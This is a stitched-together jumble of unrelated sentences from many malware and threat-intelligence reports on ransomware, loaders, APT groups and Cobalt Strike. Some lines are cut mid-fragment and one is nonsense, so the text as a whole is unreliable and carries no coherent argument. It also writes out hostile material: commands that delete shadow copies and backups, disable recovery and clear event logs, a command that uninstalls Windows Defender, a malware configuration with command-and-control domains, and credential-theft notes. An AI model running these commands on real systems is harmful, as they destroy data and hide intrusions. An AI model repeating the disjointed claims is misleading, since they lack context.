This is most likely code that has been copy/pasted from the lite loader.
About Nefilim Ransomware Nefilim ransomware emerged in March 2020 when Nemty operators quit the ransomware as a service model to concentrate their energy on more targeted attacks with more focused resources.
Data exfiltration is likewise automated: policies can contain a cache_size or cache_count parameter, which determines how much data can be collected locally by the corresponding class before it is staged for exfiltration. 
rundll32.exe C:\Windows\system32\rundll32.exe 19284 powershell.exe “c:\windows\syswow64\windowspowershell\v1.0\powershell.exe” -Version 5.1 -s
DLL" fullword wide $s3 = "CREATEPROCESS_MANIFEST_RESOURCE_ID RT_MANIFEST \"res\\\\APP.exe.manifest\"" fullword ascii $s4 = "msinfo32.exe" fullword ascii $s5 = "user32.dll,LockWorkStation" fullword wide $s6 = "DontSleep.exe" fullword wide $s7 = "UMServer.log" fullword ascii $s8 = "_Autoupdate.exe" fullword ascii $s9 = "BlockbyExecutionState: %d
In particular, it contacts the C2 server, sends heartbeats messages and receives commands.
Since the war with Russia began, Ukraine’s energy sector has been under constant cyberattack.
FCSmemtasmepocsPDVFSServiceQBCFMonitorServiceQBFCServiceQBIDPServiceRTVscanSavRoamsophossqlstc_raw_agentsvc$veeamVeeamDeploymentServiceVeeamNFSSvcVeeamTransportSvcVSNAPVSSvssYooBackupYooITzhudongfangyuThe following is a hardcoded list of directories and files to be omitted from encryption: ...
South African victims are from a single organization in the diamond industry, with the Hong Kong victim being a jeweler. 
Although their RaaS has only been active for the past couple of months it had compromised at least 75 organizations at the time of this publication.
At the start of the malware, it populates the list with the system’s DNS, and the OpenDNS server is only used as a backup to ensure that the C2 domain is resolved. 
Other cybercriminals would want to associate themselves with the deterrence already afforded by past acts of LockBit. 
Using Qualys Custom Asset and Remediation, you can utilize the following PowerShell community scripts to identify potential infected assets by either copying the contents of the script manually or pointing the tool to the GitHub script directly to download. 
GMTETag:
This can be done by a couple of PowerShell commands generating KRB-TGS-REQ as shown below: Figure 11 – Kerberos TGS request Consequently, the Domain Controller sends the TGS-RESP with the ticket of the service account which will be cached in the memory and can be extracted by dumping tools like Mimikatz as a .kirbi document.
powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI This command was downloaded from a remote site to a file named pon!.txt and then executed locally. 
Persistence Technique Title ID Use Recommendations Account Manipulation T1098 The actors changed the password for the local administrator account on several hosts. 
The following morning, the client’s CISO contacted the Quadrant team to report that there was indeed an active compromise within their environment. 
The wp-sale.js file contains a hash, the name of the backdoor file, and uses the ‘:demowpsale:’
We look forward to hearing from you. 
The Trojan Overview of the Windows Trojan components The Windows version of the Trojan consists of the following components: The Hider, the first launched component.
2172812BE94BFBB5D11B43A8BF53F8D3AE323636Skype-x64.msiWin32/Agent.
The malware shares high-level functionality with other malware families.
While much of the code base is the same, there are several key differences. 
The adversary started a password spraying attack against those domain admin accounts, and successfully got a valid domain admin account this way.
Stealing FeaturePersistenceHTTP C2 CommunicationConclusionIndicators of CompromiseSamplesInfrastructureAdditional ResourcesAppendix Introduction LokiBot (often referred to as Loki-bot or Loki PWS) is notorious information-stealing malware.
Background At the end of September 2022, we observed new BlueNoroff malware in our telemetry.
While such overlap is insufficient for attribution, it is nonetheless consistent with other evidence linking Domino to an ITG14 developer and may indicate the latter’s preference for MivoCloud for at least some of their C2 addresses.
The document lures users into downloading a malicious password-protected archive with the embedded link.
It is likely GoldMax has been used as a long-term persistence backdoor during StellarParticle-related compromises, which would be consistent with the few changes made to the malware to modify existing functions or support additional functionality. 
The preview identifies the prevalence and severity of select top emerging threats across the globe which enables the Security Operations Center (SOC) to prioritize threat response actions and gather relevant cyber threat intelligence (CTI) associated with the threat, in this case NetWalker ransomware.
[D3-SEA] Isolate: Execution Isolation Executable Allowlisting
As of November 2022, Hive ransomware actors have victimized over 1,300 companies worldwide, receiving approximately US$100 million in ransom payments, according to FBI information.
Some security tools use signatures or keywords to detect malware.
Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts, such as executables using DLL load-order hijacking that can activate malware. 
Defense evasion (TA0005) 
Finding a better story is left as an exercise for the reader. 
Credential AccessT1552.002Unsecured Credentials: Credentials in RegistryModPipe’s GetMicInfo module retrieves encrypted database passwords for ORACLE MICROS RES 3700 POS software from Windows Registry and uses a custom algorithm to decrypt them before uploading to the C&C. DiscoveryT1057Process DiscoveryModPipe’s ProcList module can get information about processes running on a system. 
Looking for the default Cobalt Strike TLS certificate. 
Scan the virtual memory for the strings related to analysis tools. 
S0412 ZxShell
The school year for most educational institutions in the U.S. typically starts in late August-September and ends in June.
Once the threat actor had a Chrome cookies file from a user that had already passed an MFA challenge recently (for example, a timeout was 24 hours), they decrypted the cookies file using the user’s DPAPI key.
Once an attacker gains a foothold on the victim system, the attacker drops and executes its components such as anti-antivirus, exfiltration tools, and finally Nefilim itself. 
The downloader uses several techniques to evade analysis and detection such as using legitimate file-sharing sites and cloud hosting services for payload storage and delivery as well as encryption and obfuscation of the GuLoader shellcode and payloads. 
Wave 1 sample – messaging after failed execution Wave 2 sample – different messaging after failed execution The wave 2 ransomware sample continues execution and checks for the mutex Screenlimitsdevices#77!;, a value that differs from the wave 1 sample’s mutex:abcdefghijklmnoklmnopqrstuvwxyz01234567890abcdefghijklmnopqrstuvwxyz01234567890 Although we call this malware ransomware based on its behavior, the encrypted files are, in fact, unrecoverable.
Finally, the malware allows remote command execution by allocating a new region of memory and executing the received shellcode by calling a new dedicated thread. 
However, they’re still a powerful weapon in the hands of skilled operators.
On execution, a decoy PDF is displayed to the user using xdg-open, which will open the document using the user’s preferred PDF viewer (see Figure 3).
We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. 
The attack was a multi-stage chain where attackers compromised a version of the 3CX VoIP desktop client, which was then used to target the company’s customers.
The rest of this report section focuses on the Forked DLL Loader, as that is where these differences exist.
Discovered in 2017, what started as a commodity malware is now currently being deployed as an initial access broker by ransomware threat actors. 
Similar to the previous activity, GuLoader execution begins with the user clicking on a shortcut file and launching a PowerShell command, which retrieves a decoy tax document and VBS script. 
Disable password “hints.” 
This happened following the exploitation of the Exchange ProxyShell vulnerability on that server, as we describe in ESET Threat Report T3 2021. 
Field 5: Flag to write empty file to %TEMP% upon successful injection Field 6: Wait timeout used for Windows events within the code Field 7: Unknown flag used (injection type 1 only) Field 8: Flag to enable sleep obfuscation after creating an injected thread (injection type 1 only) Field 9: Flag to enable sleep obfuscation via a separate thread Field 10: Flag to enable sleep obfuscation Field 11: Flag to patch APIs After parsing the configuration, this loader prepends a stub containing 79 bytes of junk instructions before the actual payload shellcode.
This was not surprising as we have noticed this threat actor targeting this industry since 2019 during our Operation DRBControl investigation, and later in 2021 with an update of SysUpdate.
Many of these variants contain or remove functionality depending on the operator’s unique requirements at the time, which may suggest that multiple operators have access to the source code or a builder, or that a close relationship exists between the developers and operators. 
Our investigation started with the TONESHELL C&C server 38[.]54[.]33[.]228 that had the remote desktop service enabled.
The IP address 144[.]76[.]173[.]247 was not encountered during the analysis. 
Spearphishing Attachment [T1566.001] Phishing:
Late in March 2023, it was discovered that the desktop application for both Windows and macOS contained malicious code that enabled a group of attackers to download and run arbitrary code on all machines where the application was installed.
Several hosts showed rundll32 processes exhibiting common process injection behavior, where the MZ file header is seen in the starting memory address in rundll32 processes with PAGE_EXECUTE_READWRITE permissions. 
The malicious code is written into the newly created process and the suspended thread context instruction pointer is changed using NtGetContextThread/NtSetContextThread. 
The use of appspot and azureedge domains as well.
This functionality can be invoked on any process via the IOCTL_HIDE_PROCESS_BY_PROCESSID (0x222028) control code.
Around the same time, we started receiving reports from some of our partners and their ISPs about Gootkit-related traffic.
Windows Command ShellThe malware updater uses cmd.exe to download files from Alibaba Cloud Object Storage Service. 
This variant gets its name from its mutex: HELLOKITTYMutex. 
Infection Script use of lwp-download The key take away from analyzing these infection scripts is noting unique additions, like lwp–download, combined with the destination of download requests.
CSC 4 Controlled Use of Admin Privileges CSC 5 Secure Configuration CSC 9 Limitation of Network Ports and Protocols CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Persistence Registry Key – Place Value on Run Once Key (T1060) 
In this blogpost, we corroborate these findings and provide additional evidence about the connection between Lazarus and the 3CX supply-chain attack. 
We have seen SYS01 stealer attacking critical government infrastructure employees, manufacturing companies, and other industries.
If all checks pass, the malware proceeds to decrypt the PowerShell code and starts downloading the main ViperSoftX routine.
With no additional services, software or drivers loaded the system is at its most vulnerable.
C!dha Microsoft Defender Antivirus detects the Soldier implant as the following malware: Trojan:MSIL/SoldierAudio.A!dha Trojan:MSIL/SoldierAudio.
The HTML code in this file contains embedded JavaScript functionality, which displays ransom note details as shown below in Figure 1. 
DB2DF1BDF8145CB8ABA3A2026A3CC3EF4F1762BEphx.dllWin32/Agent.TWILookBack trojanized libcurl loader. 
A replication of this algorithm, written in Python, can be found in our GitHub repository. 
Obfuscation is one of the most popular methods to achieve this.
Fundamentally, the sample’s respective flags distill down into encryption operations of local, mount and discovery. 
LockBit 2.0 download speed, according to LockBit 2.0 operator.
Previously, this group has been observed targeting government officials, particularly in Southeast Asian countries.
|findstr taskhostProcess discoverytasklist /v
We observed in the process dump the exfiltration of data on the system, such as OS, Processor (architecture), Domain, Username, etc. 
OutlookRansomware will likely continue to be incorporated into the attack methods of threat actors targeting public and private entities in LATAM due to their availability as ransomware-as-a-service (for non-technical threat actors) and highly successful infection rates.
[T1588]: Tools [T1588.002] Chinese state-sponsored cyber actors have been observed using Cobalt Strike:registered: and tools from GitHub:registered: on victim networks. 
Implement an antivirus program and a formalized patch management process. 
Figure 3 – VBA macro which moves the tmp file to the templates folder as a DLL. 
This can be extremely time consuming and requires a high degree of technical knowledge.
In addition, it generates two files, one with a .z extension and another with a .zip extension.
Companies still struggle to detect Cobalt Strike also due to the various defensive techniques it has.
The MD5 hash of the password is then calculated, and if it is equal to 4dbf44c6b1be736ee92ef90090452fc2, the program will continue running. 
T1190 Exploit Public-Facing Applications Vulnerabilities such as ProxyShell (CVE-2021-34473) and improper SQL sanitization (CVE-2021-20028)
This Mint Sandstorm subgroup is technically and operationally mature, capable of developing bespoke tooling and quickly weaponizing N-day vulnerabilities, and has demonstrated agility in its operational focus, which appears to align with Iran’s national priorities. 
Also, the function within Domino Backdoor to enumerate running processes and send a list of process names and IDs back to the C2 is very similar to the functionality of Lizar’s ListProcesses32/ListProcesses64.dll plugin. 
The stealthiness of a supply-chain attack makes this method of distributing malware very appealing from an attacker’s perspective.
Ensure that all zones have Zone Protection Profiles with all Reconnaissance Protection settings enabled, tuned, and set to appropriate actions Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Cortex XSOAR Deploy XSOAR Playbook - Access Investigation Playbook Deploy XSOAR Playbook - Block Account Generic Deploy XSOAR Playbook - Impossible Traveler Deploy XSOAR Playbook - Port Scan Deploy XSOAR Playbook Cortex XDR - Isolate Endpoint Cortex XDR Prevent Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Enable Anti-Malware Protection Configure Host Firewall Profile Threat Prevention Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement 
As seen with fshec2, analyzing this kind of file allows defenders to extract indicators of malicious intent, making security assessment much easier. 
Mitigation: Organizations may consider weighing the risk of storing credentials in password stores and web browsers.
Its name blends in with the rest of the legitimate code.
You can try Secure Email for free here.
The script enters a final loop to once again check for the presence of an Activity Monitor process.
The archive file is typically titled with one of the naming schemes (a few are listed below): doc-Impuestos_<[0-9]{6}>.rar doc-Impostos_<[0-9]{6}>.rar Documento_Impostos_<[0-9]{6}>.rar Multa_<[0-9]{6}>.rar Impuestos-Documento_<[0-9]{6}>.rar BlackBerry found different campaigns geofenced to each specific country.
It can affect both Windows and Linux OS, as the operator released a Linux version of LockBit 2.0 to target VMware ESXi hypervisor systems in October 2021, coded exclusively in the C programming language. 
The credentials also allow BlackCat to move laterally within the victim’s system and/or network, often with administrative privileges.
This can be difficult to detect, as there are multiple degrees of separation before the Cobalt Strike payload is executed.
Figure 14.
Asymmetric Cryptography Lateral Movement T1021.004: SSH T1021.005: VNC Credential Access T1003.001:
In July 2021, as described in our HelloKitty ATOM, Unit 42 came across a Linux (ELF) sample with the name funny_linux.elf that had a ransom note with contents similar to those of HelloKitty for Windows samples.
The MSI installers are signed by “Kancelaria Adwokacka Adwokat Aleksandra Krzemińska” (Figures 1-2). 
See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques. 
C0026 C0026
At this point, visibility becomes muddled due to the focus of observation and detection is ingress and egress traffic.
The “victim” for this assessment was a large organization with multiple geographically separated sites throughout the United States.
FQDN C:\XX\[a-z0-9]{6}\[a-z0-9]{3}\domain-2.FQDN 
Although the reason for registering this application is unclear, within a few days the actor registered and granted permission to another application, ‘Newsletter Software Supermailer’, and created a new inbox rule names ‘s’ on the mailbox of the hijacked account.
Thus, in order to find a collision, we can simply work in the scalar field and find a solution to the equation ⟨M1⟩
Victims receive Gootkit itself or, in some cases, the REvil (Sodinokibi) ransomware.
Conclusion IronNetInjector is another toolset in Turla’s ever-growing arsenal, made of an IronPython script and an injector.
Receives the next Security Shellcode from the C2 server and repeats the steps above. 
Remote Desktop Protocol Black Basta has used RDP for lateral movement. 
The hardcoded 208.67.222.222 resolves to a legitimate OpenDNS DNS server.
Of course, this requires the IronPython interpreter to also be present on the system, but that can be accomplished in different ways.
Monitor processes and command-line arguments for actions that could be taken to gather system and network information.
In the Active Directory domain joined environment, if other users have logged into the compromised machine, provided a malware is running with escalated privileges, it can extract other user’s master keys from the LSASS memory which can then be used to decrypt their secrets.
It’s similar in structure to the previously used in-memory loading mechanism to execute malware with the help of PowerShell scripts.
HackTool.
As the adversary used Cobalt Strike with DNS as command & control protocol, we were able to reconstruct more than two years of adversary activity.
First of all, the file name is passed dynamically rather than hardcoded. 
Domain fronting was mostly used by web services to bypass censorship in several countries that restricted traffic (e.g., China).
Media Inquiries / Press Desk: • NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov • CISA Media Relations, 703-235-2010, CISAMedia@cisa.dhs.gov • FBI National Press Office, 202-324-3691, npo@fbi.gov References [1] FireEye:
It was later restored in version 3.0, but in a different form.
The latter are the stealing functions. 
DLL Side-Loading V1 
The threat actors began enumerating the network once Emotet deployed a Cobalt Strike beacon on the beachhead host.
However, this file and other stage names were changed multiple times during our investigation. 
Instead, they suspend the remote process threads and install the hooks remotely.
Figure 3.
domains some behavior from Windows Explorer was found, which might cause some RCE if a Java Runtime Environment (JRE) is installed. 
Additionally, the following observations are worth mentioning: The user-mode malware stager deployed by the UEFI implant contains a scheduling logic that is somewhat similar to one seen in Microcin samples (some of which were also found on infected hosts in this campaign).
Token
One of the primary tasks towards achieving credential-based deception is to stage the deceptive credentials in LSASS process memory.
[WINDOWS-SECURITY] Possible UAC Bypass - Rundll32.exe using DLLRegister 5008351 
Note: Until the update is fully implemented, consider removing vulnerable components from the internet to limit the scope of traffic.
The following is an exhaustive list of de-obfuscated strings: DE-OBFUSCATED STRINGS \\.\root\CIMV2SELECT UUID FROM Win32_ComputerSystemProduct"WQL”L"UUID”"Unknown CLR”L"pwrshplugin.dll”L"kernel32.dll”"RtlGetVersion”"RtlRandomEx”"RtlIntegerToUnicodeString”"RtlDecompressBuffer”"RtlGetCompressionWorkSpaceSize”"RtlCompressBuffer”"RtlComputeCrc32”"Windows 2000”"Windows XP”"Windows XP Professional”"Windows Server 2003”"Windows
However, once the handwriting recognition feature is enabled, text from every document and email is indexed into this file, not only the files that interacted with the touchscreen feature.
DATA FORMAT ERROR Returned mail: see transcript for details Mail System Error - Returned Mail The following attachment names were also found to be used repeatedly: document.zip transcript.zip letter.zip attachment.zip .zip message.zip message.scr golfasian.com readme.scr mail.zip text.cmd <random number>@7686f6a96.com file.zip attachment.scr Typical attachment The MyDoom executables attached to its phishing e-mails have an extension hidden by default by most Windows deployments (.cmd, .scr, .com, etc.).
The attacker also asks the target “Would you be available for a quick telephone call on Friday?”
ExecutionT1059.003Command and Scripting Interpreter:
Xollam the Latest Face of TargetCompany
These tweets depicted HelloKitty ransomware payloads appending a .v-society extension to encrypted files on June 10, 2021. 
Dridex uses a variation of AtomBombing that queues an APC to call memset to clean an RW region in ntdll.dll.
[S0032] GreenRAT jjdoor/Transporter jumpkick Murkytop (mt.exe)
The names of these files change between executables.
Annotated disassembly of the control flow obfuscation snippet The above snippet is bookended by calls to two anti-debugging functions, as can be seen in Figure 10.
This page returns a second URL, which is used to redirect the user to a third URL.
The TA581 campaign ended up loading the DLL “host.dll” from that same directory and led to one of the first campaigns of Proofpoint observing the Forked variant.
dbexport.zip\app.jar Thanks. 
This blog explains how threat actors launch an attack via phishing mail and what files are leveraged to extract the EvilExtracrtor PowerShell script.
What's more, the initial infection was of a foreign office of the client.
Stashing the Payload When launched with an argument, the installer opens and decrypts the contents of the file passed as an argument.
Use email security appliances to scan and remove malicious email attachments or links. Monitor key internal security tools and identify anomalous behavior.
S0388 YAHOYAH
These permissions would allow the threat actor to use the Microsoft Staffhub service principal to read all mail and SharePoint/OneDrive files in the organization, as well as create new accounts and assign administrator privileges to any account in the organization. 
The borg[.]wtf domain was linked to TeamTNT via a previous Unit 42 report.
The downloaded file has a random file name and might have different extensions such as “.png,” “.bmp,” and “.jpg,” among others. 
As a result, there is still a lot to accomplish and implement in terms of cyber security policies in Central American and Caribbean countries.
There is no decoy in the document.
powershell.exe Get-ADComputer -Filter * -Properties * | Export-csv C:\ProgramData\ADComputers.csv -NoTypeInformation ➝ C:\Windows\system32\cmd.exe /C
general]created_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msoleinstall_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msoledata_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\fcdata hide_user_activity_tab = 0 #File path, not including drive letter[file]100=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\responsor.dat103=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlang.exe104=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlangloc.dat#105=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rebare.dat106=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure.dat107=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure86.dat108=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure64.dat109=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\sspisrvui.dat110=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlangloc.dll101=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\E86F36C4102=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\AC1461421000=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\E19D9D4B #0x0001 Release without decryption#0x0002 Decryption release[file_out_type]100=0x0001103=0x0002104=0x0002#105=0x0002106=0x0002107=0x0002108=0x0002109=0x0002110=0x0002101=0x0001102=0x00011000=0x0001 ##Registry path: separated by'|', respectively representing HKEY_LOCAL_MACHINE, path name, value name[key]##100=0x80000002|SYSTEM\Setup\PrintResponsor|1#101=0x80000002|SYSTEM\Setup\PrintResponsor|2#102=0x80000002|SYSTEM\Setup\PrintResponsor|3#1000=0x80000002|SYSTEM\Setup\PrintResponsor|4##2000=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|1##2001=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|22001=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|1 ##0x0001 Release without decryption##0x0002 Decryption release[key_out_type]##100=0x0001#101=0x0001#102=0x0001#1000=0x0001#2000=0x00022001=0x0002 #Service Information: hhw.exe needs to be dynamically generated[service_attribute]is_hhw=0service_name=PrintResponsorservice_path=%ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\setlang.exeservice_parm= Figure 8.
The actor proceeded to log in several more times from a Surfshark VPN endpoint, however, they were not observed carrying out any further suspicious activity. 
In general, the features were simple; the malware decrypts the saved passwords to a file named “passwords.txt”, and the cookies to a file named “cookies.txt”. 
Table 1: APT40
In a similar MSBuild project file to the Remcos dropping .proj file, we found another project file named “vwnfmo.lnk“ where RedLine Stealer was dropped instead of Remcos, shown in Figure 13 below.
Before we get into that part, we should first discuss what makes Cobalt Strike so versatile. 
Palo Alto Networks customers receive help with detection and prevention of Black Basta ransomware through the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security services such as WildFire). 
The dropped files of Letter Head.docx on VirusTotal To find additional password-protected archives and documents embedded with a Google Drive link, we tried to use the following query: 
A breakdown of the keys and their values within the configuration can be seen in Table 2. Configuration Key Value pk Attacker public key dbg Debug mode wht Allow listed items Files to avoid Extensions to avoid prc Processes to terminate svc Services to terminate nname Name of ransom note file nbody Ransom note content ext Encrypted file extension Table 2.
To our knowledge, the attackers did not obtain access to information of any value whatsoever, ultimately leaving them with nothing to show for their efforts. 
After they are successfully validated, the addresses are added to the email address collection array.
Following HTTPS activity, CISA observed a suspected LDAP callback on port 443 to this IP address.
Here’s the latest from our TRU Team… What did we find? 
Whos swimming in South Korean waters Meet ScarCrufts Dolphin
Trojan.Win32.PUBLOAD In more recent cases, the malware PUBLOAD was also being delivered through Google Drive links embedded in decoy documents. 
update Packs a response containing the IDs of relays connected to the current copy, together with their system information. 
MITRE PRE-ATT&CK:registered: Framework for Analysis In the last 12 months, CISA analysts have routinely observed Chinese MSS-affiliated actors using the following PRE-ATT&CK:registered: Framework TTPs. Target Selection and Technical Information Gathering Target Selection [TA0014] is a critical part of cyber operations.
Parameters passed to the binary as observed from Linux SysUpdate samples Parameter Effect -launch Sets persistence, zeroes boolean, and exits -run Zeroes boolean and continues -x Daemonize the process, zeroes boolean, and continues -i Daemonize the process, zeroes boolean, sets persistence, and continues -f <guid> Sets the GUID to <guid> and continues The persistence is ensured by copying a script similarly named as the current filename to the /usr/lib/systemd/system/ directory, and creating a symlink to this file in the /etc/ystem/system/multi-user.target.wants/ directory.
The attackers made the same mistake with the scheduled tasks created for the updater, as the execution path also refers to a subdirectory 2 that doesn’t exist.
Persistence [TA0003] Technique Title ID Use Scheduled Task/Job: Scheduled Task T1053.005 TrickBot creates a scheduled task on the system that provides persistence. 
Far return to the address prefixed with 0x33 segment – entering the 64-bit mode Once the execution mode is changed into 64 bit, the syscall is called, its results stored, and the application can switch back to 32-bit mode to continue normal execution. 
Loader (ClientLdrExe) 
G0123 Volatile Cedar
For example, in addition to tracking SMB activity, UAL databases on Domain Controllers track Active Directory access. 
Among the threats, cyber espionage is one of the prominent activities.
/Quiet bcdedit /set {default} recoveryenabled no wmic shadowcopy delete wbadmin delete backup wbadmin delete systemstatebackup -keepversions:0 bcdedit /set {default} bootstatuspolicy ignoreallfailures bcdedit /set {default} recoveryenabled no wevtutil.exe clear-log Application wevtutil.exe clear-log Security wevtutil.exe clear-log System wbadmin delete catalog -quiet wbadmin delete catalog -quiet wbadmin delete systemstatebackup 
CISA and FBI recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory. 
Read Group.
[M1018]. Detection:
Afterwards, the skipped system directories are targeted and finally the registry hives: HKEY_LOCAL_MACHINE (containing the hives Sam, Security, Software and System), HKEY_CURRENT_USER and HKEY_USERS. 
We have written python script to defeat GuLoader shellcode control flow obfuscation and saving time and efforts of malware analyst. 
Spearphishing Attachment
During our analysis, Talos observed that a malicious server at IP address 185[.]45[.]195[.]226 hosted the PowerShell downloader script and had an open directory that the attacker eventually disabled.
Malicious actors typically gain entry to organizations’ Microsoft 365 environments by abusing either stolen account credentials or stolen session cookies
ShellExecute($file) } } catch [System.
The adoption of OLE embedding further highlights the group’s continuous experimentation with malware staging techniques. 
Content-Disposition: form-data; name=”hwid” {78494464-3fdf-11ed-8279-806e6f6e6963} Content-Disposition: form-data; name=”pid” 1 Content-Disposition: form-data; name=”lid” xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx When we examine the contents of the zip file viewed from the PCAP file, it collects information, primarily system information.
Qualys Vulnerability Management Detection and Response (VMDR) users can scan their environment with this QID to quickly detect impacted systems.
DNS Signatures detect the known C2 domains, which are also categorized as malware in Advanced URL Filtering. 
Additionally monitor for any scheduled tasks created via command line utilities—such as PowerShell or Windows Management Instrumentation (WMI)—that do not conform to typical administrator or user actions. 
Nonetheless, we have also observed additional file types such as JavaScript, Text, and PNG. 
If yes, call method i in class m to handle received request.
Credential Dumping: Local Security Authority Subsystem Service (LSASS) Memory CISA observed the threat actors using Mimikatz in conjunction with coin miner protocols and software.
193.106.191.186 3db94cf953886aeb630f1ae616a2ec25 cook32.rar d99cc31f3415a1337e57b8289ac5011e cook64.rar a1f634f177f73f112b5356b8ee04ad19 stilak32.rar 8ea6ad3b1acb9e7b2e64d08411af3c9a stilak64.rar 0c5862717f00f28473c39b9cba2953f4 vnc32.rar ce77f575cc4406b76c68475cb3693e14 vnc64.rar JoeSandbox reported this sample having the following configuration: { "RSA Public Key": "WzgHg0uTPZvhLtnG19qpIk+GmHzcoxkfTefSu6gst5n3mxnOBivzR4MH4a6Ax7hZ5fgcuPGt3NKKPbYTwmknjD2zYXaAp3+wR0kAZI+LVG1CUiDgK2lhHKV91eobjLR/Z/RtHa+MZM10+zZoBGCk+VjMy7gWkzoCrrhs6/Bft/lYT9NzAGBQ4ZZgJTkXW4tVgEQiGmoc7Ta1/NqrbaQBEciYTW7E4egMKHQeGNrjd94u5PZha7GgX7aseTe7/68QIz2hc7Xl2gtUGQYYVqKgGpKjKrQT5jpYbcjLE+VoRjcWucFAPAfIryWH1A4T+PbO5+eHGGCIM/fAuYU/58JZn0HUmtKm9wHYCUJ/uGotKAI=", "c2_domain": [ "superliner.top", "superlinez.top", "internetlined.com", "internetlines.in", "medialists.su", "medialists.ru", "mediawagi.info", "mediawagi.ru", "5.42.199.83", "denterdrigx.com", "и", "digserchx.at" ], "ip_check_url": [ "http://ipinfo.io/ip", "http://curlmyip.net" ], "serpent_key": "Jv1GYc8A8hCBIeVD", "tor32_dll": "file://c:\\test\\test32.dll", "tor64_dll": "file://c:\\test\\tor64.dll", "server": "50", "sleep_time": "1", "SetWaitableTimer_value(CRC_CONFIGTIMEOUT)": "60", "time_value": "60", "SetWaitableTimer_value(CRC_TASKTIMEOUT)": "60", "SetWaitableTimer_value(CRC_SENDTIMEOUT)": "300", "SetWaitableTimer_value(CRC_KNOCKERTIMEOUT)": "60", "not_use(CRC_BCTIMEOUT)": "10", "botnet": "3000", "SetWaitableTimer_value": "1" } Pivoting on domains registered in WHOIS with the email [email protected] or organization Rus Lak, reveals many similar domains as seen in this intrusion. 
fish 760? pier%complaint
The new variants The “Forked” IcedID loader is quite similar to the “Standard” version in terms of its role, sending basic host info to the C2 and then fetching the IcedID bot. 
When byte code bites Who checks the contents of compiled Python files
September 15, 2022.
The classes are orchestrated by an instance of fc_kernel_manager.
While installing the updates, ensure network perimeter access controls are as restrictive as possible. 
"iscsiwmi" /t
When the payload was executed, there were some telltale registry events observed indicating .Quantum file extension Shell Open Command artifacts. 
The infection chain starts with a malicious RAR archive — in this instance, contract.rar (SHA256: 658725fb5e75ebbcb03bc46d44f048a0f145367eff66c8a1a9dc84eef777a9cc) — which is distributed to victims via phishing attempts or through social media.
27 Returns information about the computer system (from SELECT *
In November 2022, Proofpoint researchers observed the first new variant of IcedID Proofpoint dubbed “IcedID Lite” distributed as a follow-on payload in a TA542 Emotet campaign.
The initial dropper is coded in C#.
O365 Application Impersonation Another consistent TTP identified during StellarParticle investigations has been the abuse of the ApplicationImpersonation9 role.
Users of the Qualys Cyber Security Asset Management can quickly identify all installed software across their organization.
User Execution: Malicious File Defense Evasion T1140 Deobfuscate/Decode Files or Information Defense Evasion T1027 Obfuscated Files or Information Defense Evasion T1574.002 Hijack Execution Flow: DLL Side-Loading Defense Evasion T1553.002 Subvert Trust Controls: Code Signing Defense Evasion T1497.003 Virtualization/Sandbox Evasion: Time-Based Evasion Credential Access T1555 Credentials from Password Stores Credential Access T1539 Steal Web Session Cookie Command and Control T1132.001 Data Encoding: Standard Encoding Command and Control T1102.001 Web Service:
Those files will later be sent to the malware C2 server, allowing the cybercriminals to make transactions through a fraudulent PoS device registered in the name of a fake company. 
The password is: infect3d ...please though, don't infect yourself! 
To: 07d14d16d21d21d00042d41d00041de5fb3038104f457d92ba02e9311512c2 This change was highlighted by @bodziurity and @WLesicki in a collaborative effort: Cobalt Strike has a post dedicated to JARM that goes into detail on how JARM works and how the specific hash value is created based on the Java version. 
This type of threats is usually delivered as email attachments.
[T1573.002] Exfiltration [TA0010] Exfiltration Over C2 Channel [T1041] Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
The infection chain begins with the user receiving a phishing email.
[12/May/2023:21:17:55 +0000] "POST /wp-admin/plugins.php?wc-ajax=1&action=activate&plugin=posts-layouts%2Fposts-layouts.php&plugin_status=all&_wpnonce=810f12b23c" 302 0 - 16276 25581 193.169.195.64 -
The configuration information for the newly created transport rules were seen in Exchange audit event New-TransportRule.
The Post-Validator collects information that allows it to identify the victim machine (running processes, recently opened documents, screenshots) and sends it to a C2 server specified in its configuration. 
Figure 20.
The MITRE Cyber Analytics Repository (CAR) details the Get System elevation, CAR-2021-02-002: Get System Elevation Winlogon Token Impersonation/Theft Multiple access to WinLogon with granted access 0x40
S0357 Impacket
